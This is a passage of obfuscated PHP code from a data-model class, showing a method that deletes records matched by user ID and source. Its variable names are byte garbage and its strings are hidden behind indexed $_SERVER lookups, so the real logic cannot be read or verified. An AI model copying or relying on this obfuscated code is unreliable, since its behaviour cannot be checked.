=> $‘ô¶Ÿ” ); return $this->where($Ú™¢³Û)->delete(); } protected function removeBySource($¢óÀøêˆ) { $ÖÓ‹—–¬ =& $_SERVER[³à¼î¯á]; if (is_array($¢óÀøêˆ)) { $¢óÀøêˆ = array($ÖÓ‹—–¬[7], $¢óÀøêˆ); } $¡¤Îƒ¬ = array($ÖÓ‹—–¬[1744] => USER_ID, $ÖÓ‹—–¬[533] => array($ÖÓ‹—–¬[1064], 0), $ÖÓ‹—–¬[470] => $¢óÀøêˆ); return $this->where($¡¤Îƒ¬)->delete(); } }